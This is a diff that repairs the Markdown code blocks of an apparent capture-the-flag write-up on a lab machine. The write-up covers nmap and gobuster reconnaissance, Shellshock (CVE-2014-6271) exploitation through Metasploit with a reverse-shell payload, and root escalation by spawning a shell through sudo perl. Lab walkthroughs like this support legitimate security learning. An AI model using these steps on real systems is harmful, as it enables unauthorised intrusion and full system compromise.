@@ -20,7 +20,9 @@ permissions on perl.
 
 Port scan using nmap:
 
-```bashnmap -Pn -sCV -p- --top-ports 1000 -T3 10.10.10.56
+```bash
+nmap -Pn -sCV -p- --top-ports 1000 -T3 10.10.10.56
+```
 
 **Open ports:**
 
@@ -35,9 +37,11 @@ Port scan using nmap:
 
 Found cgi-bin directory and enumerated scripts:
 
-```bashgobuster dir -u http://10.10.10.56/cgi-bin/ 
--w /usr/share/wordlists/dirb/common.txt 
+```bash
+gobuster dir -u http://10.10.10.56/cgi-bin/ \
+-w /usr/share/wordlists/dirb/common.txt \
 -x sh,cgi,pl,php
+```
 
 Found script: `user.sh`
 
@@ -50,13 +54,15 @@ matching the Linux `uptime` command.
 
 Exploited CVE-2014-6271 (Shellshock) using Metasploit:
 
-```bashmsfconsole
+```bash
+msfconsole
 search CVE-2014-6271
 use 0
 set payload cmd/unix/reverse_openssl
 set LHOST tun0
 set RHOST 10.10.10.56
 run
+```
 
 Received shell as **shelly**.
 
@@ -64,7 +70,9 @@ Received shell as **shelly**.
 
 ## 4. User Flag
 
-```bashcat /home/shelly/user.txt
+```bash
+cat /home/shelly/user.txt
+```
 
 ---
 
@@ -72,18 +80,24 @@ Received shell as **shelly**.
 
 Checked sudo permissions:
 
-```bashsudo -l
-(root) NOPASSWD: /usr/bin/perl
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/bin/perl
+```
 
 Spawned root shell via perl:
 
-```bashsudo /usr/bin/perl -e 'exec "/bin/sh"'
+```bash
+sudo /usr/bin/perl -e 'exec "/bin/sh"'
 whoami
-root
+# root
+```
 
 Retrieved root flag:
 
-```bashcat /root/root.txt
+```bash
+cat /root/root.txt
+```
 
 ---
 
